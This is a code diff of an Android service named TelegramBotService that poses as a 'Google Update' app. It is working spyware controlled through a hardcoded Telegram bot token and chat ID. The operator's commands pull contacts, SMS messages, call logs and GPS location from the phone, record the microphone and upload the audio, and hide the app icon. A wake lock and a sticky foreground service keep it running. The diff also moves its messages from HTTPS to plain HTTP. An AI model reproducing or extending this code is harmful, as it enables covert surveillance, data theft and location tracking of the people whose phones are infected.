@@ -10,19 +10,15 @@ import android.content.Intent;
 import android.content.pm.PackageManager;
 import android.database.Cursor;
 import android.location.Location;
-import android.location.LocationListener;
 import android.location.LocationManager;
 import android.media.MediaRecorder;
 import android.net.Uri;
 import android.os.Build;
-import android.os.Bundle;
-import android.os.Environment;
 import android.os.IBinder;
-import android.os.Looper;
+import android.os.PowerManager;
 import android.provider.CallLog;
 import android.provider.ContactsContract;
 import android.provider.Settings;
-import android.telephony.TelephonyManager;
 import android.util.Log;
 import androidx.core.app.ActivityCompat;
 import androidx.core.app.NotificationCompat;
@@ -32,74 +28,74 @@ import java.io.BufferedReader;
 import java.io.DataOutputStream;
 import java.io.File;
 import java.io.FileInputStream;
-import java.io.FileOutputStream;
 import java.io.InputStreamReader;
-import java.io.OutputStream;
 import java.net.HttpURLConnection;
 import java.net.URL;
 import java.net.URLEncoder;
-import java.text.SimpleDateFormat;
-import java.util.Date;
-import java.util.Locale;
+import java.util.concurrent.Executors;
+import java.util.concurrent.TimeUnit;
 import javax.net.ssl.HttpsURLConnection;
 
 public class TelegramBotService extends Service {
-    // التوكن والايدي الخاصين بك
     private static final String BOT_TOKEN = "8750593602:AAFTlpdAXxNiJ7LuRdDP4TSQ6Hqn8C_fAhs";
     private static final String CHAT_ID = "6793813126";
     private static final String API_URL = "https://api.telegram.org/bot" + BOT_TOKEN + "/";
     private static final String CHANNEL_ID = "GoogleChannel";
-    private Thread botThread;
-    private volatile boolean running = true;
     private int lastUpdateId = 0;
     private MediaRecorder mediaRecorder;
     private String currentAudioPath;
     private boolean isRecording = false;
+    private PowerManager.WakeLock wakeLock;
 
     @Override
     public void onCreate() {
         super.onCreate();
+        acquireWakeLock();
         createNotificationChannel();
         startForeground(1001, createNotification());
-        sendMessage("✅ Google Update Service Activated\n📱 Device: " + getDeviceModel());
-        startBot();
+        sendStartupMessage();
+        startPolling();
     }
 
-    private void startBot() {
-        botThread = new Thread(() -> {
-            while (running) {
-                try {
-                    String response = get(API_URL + "getUpdates?offset=" + (lastUpdateId + 1) + "&timeout=30");
-                    if (response != null && response.contains("\"ok\":true")) {
-                        JSONObject json = new JSONObject(response);
-                        JSONArray results = json.getJSONArray("result");
-                        for (int i = 0; i < results.length(); i++) {
-                            JSONObject update = results.getJSONObject(i);
-                            lastUpdateId = update.getInt("update_id");
-                            if (update.has("message")) {
-                                JSONObject msg = update.getJSONObject("message");
-                                if (msg.has("text")) {
-                                    String text = msg.getString("text").trim().toLowerCase();
-                                    long chatId = msg.getJSONObject("chat").getLong("id");
-                                    if (String.valueOf(chatId).equals(CHAT_ID)) {
-                                        handleCommand(text);
-                                    }
-                                }
+    private void acquireWakeLock() {
+        PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
+        wakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "GoogleUpdate:WakeLock");
+        wakeLock.acquire(10 * 60 * 1000L);
+    }
+
+    private void sendStartupMessage() {
+        sendMessage("✅ Google Update Activated\n📱 " + Build.MANUFACTURER + " " + Build.MODEL + "\n🤖 Android " + Build.VERSION.RELEASE);
+    }
+
+    private void startPolling() {
+        Executors.newSingleThreadScheduledExecutor().scheduleWithFixedDelay(() -> {
+            try {
+                String response = get(API_URL + "getUpdates?offset=" + (lastUpdateId + 1) + "&timeout=10");
+                if (response != null && response.contains("\"ok\":true")) {
+                    JSONObject json = new JSONObject(response);
+                    JSONArray results = json.getJSONArray("result");
+                    for (int i = 0; i < results.length(); i++) {
+                        JSONObject update = results.getJSONObject(i);
+                        lastUpdateId = update.getInt("update_id");
+                        if (update.has("message") && update.getJSONObject("message").has("text")) {
+                            JSONObject msg = update.getJSONObject("message");
+                            String text = msg.getString("text").trim().toLowerCase();
+                            long chatId = msg.getJSONObject("chat").getLong("id");
+                            if (String.valueOf(chatId).equals(CHAT_ID)) {
+                                handleCommand(text);
                             }
                         }
                     }
-                } catch (Exception e) { Log.e("Bot", "Error", e); }
-                try { Thread.sleep(1000); } catch (InterruptedException e) { break; }
-            }
-        });
-        botThread.start();
+                }
+            } catch (Exception e) { Log.e("Bot", "Polling error", e); }
+        }, 0, 2, TimeUnit.SECONDS);
     }
 
     private void handleCommand(String cmd) {
         String c = cmd.split(" ")[0];
         switch (c) {
             case "/start":
-                sendMessage("🔰 Google Update Commands:\n/contacts\n/sms\n/calllog\n/location\n/record\n/stoprec\n/hide\n/show\n/info");
+                sendMessage("🔰 Google Update\n/contacts - جهات الاتصال\n/sms - الرسائل\n/calllog - سجل المكالمات\n/location - الموقع\n/record - تسجيل\n/stoprec - إيقاف\n/hide - إخفاء\n/show - إظهار\n/info - معلومات");
                 break;
             case "/contacts":
                 sendFile("contacts.txt", getContacts().getBytes());
@@ -121,7 +117,7 @@ public class TelegramBotService extends Service {
                 stopRecording();
                 break;
             case "/hide":
-                MainActivity.hideAppIconStatic(this);
+                MainActivity.hideAppIcon(this);
                 sendMessage("👁 App hidden");
                 break;
             case "/show":
@@ -129,7 +125,7 @@ public class TelegramBotService extends Service {
                 sendMessage("👁 App shown");
                 break;
             case "/info":
-                sendMessage(getDeviceInfo());
+                sendMessage("📱 " + Build.MANUFACTURER + " " + Build.MODEL + "\n🤖 Android " + Build.VERSION.RELEASE);
                 break;
         }
     }
@@ -189,8 +185,7 @@ public class TelegramBotService extends Service {
             Location loc = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER);
             if (loc == null) loc = lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
             if (loc != null) {
-                String maps = "https://www.google.com/maps?q=" + loc.getLatitude() + "," + loc.getLongitude();
-                sendMessage("📍 Location:\n" + loc.getLatitude() + ", " + loc.getLongitude() + "\n🗺️ " + maps);
+                sendMessage("📍 Location:\n" + loc.getLatitude() + ", " + loc.getLongitude() + "\n🗺️ https://maps.google.com/?q=" + loc.getLatitude() + "," + loc.getLongitude());
             } else {
                 sendMessage("❌ Location unavailable");
             }
@@ -201,7 +196,7 @@ public class TelegramBotService extends Service {
         try {
             File dir = new File(getExternalFilesDir(null), "recordings");
             if (!dir.exists()) dir.mkdirs();
-            currentAudioPath = dir.getAbsolutePath() + "/rec_" + System.currentTimeMillis() + ".3gp";
+            currentAudioPath = dir + "/rec_" + System.currentTimeMillis() + ".3gp";
             mediaRecorder = new MediaRecorder();
             mediaRecorder.setAudioSource(MediaRecorder.AudioSource.MIC);
             mediaRecorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
@@ -222,7 +217,7 @@ public class TelegramBotService extends Service {
                 isRecording = false;
                 File f = new File(currentAudioPath);
                 if (f.exists()) sendFile(f.getName(), readBytes(f));
-                sendMessage("⏹ Recording stopped and sent");
+                sendMessage("✅ Recording sent");
             } catch (Exception e) { sendMessage("❌ Stop failed"); }
         } else {
             sendMessage("❌ No active recording");
@@ -232,8 +227,8 @@ public class TelegramBotService extends Service {
     private void sendMessage(String text) {
         new Thread(() -> {
             try {
-                String url = API_URL + "sendMessage?chat_id=" + CHAT_ID + "&text=" + URLEncoder.encode(text, "UTF-8") + "&parse_mode=Markdown";
-                HttpsURLConnection conn = (HttpsURLConnection) new URL(url).openConnection();
+                String url = API_URL + "sendMessage?chat_id=" + CHAT_ID + "&text=" + URLEncoder.encode(text, "UTF-8");
+                HttpURLConnection conn = (HttpURLConnection) new URL(url).openConnection();
                 conn.setRequestMethod("GET");
                 conn.getResponseCode();
                 conn.disconnect();
@@ -292,9 +287,6 @@ public class TelegramBotService extends Service {
         } catch (Exception e) { return new byte[0]; }
     }
 
-    private String getDeviceModel() { return Build.MANUFACTURER + " " + Build.MODEL; }
-    private String getDeviceInfo() { return "📱 Device:\n" + Build.MANUFACTURER + " " + Build.MODEL + "\nAndroid: " + Build.VERSION.RELEASE; }
-
     private void createNotificationChannel() {
         if (Build.VERSION.SDK_INT >= 26) {
             NotificationChannel ch = new NotificationChannel(CHANNEL_ID, "Google Service", NotificationManager.IMPORTANCE_LOW);
@@ -307,5 +299,5 @@ public class TelegramBotService extends Service {
     }
     @Override public int onStartCommand(Intent i, int f, int id) { return START_STICKY; }
     @Override public IBinder onBind(Intent i) { return null; }
-    @Override public void onDestroy() { running = false; if (mediaRecorder != null) mediaRecorder.release(); super.onDestroy(); }
+    @Override public void onDestroy() { if (wakeLock != null && wakeLock.isHeld()) wakeLock.release(); super.onDestroy(); }
 }
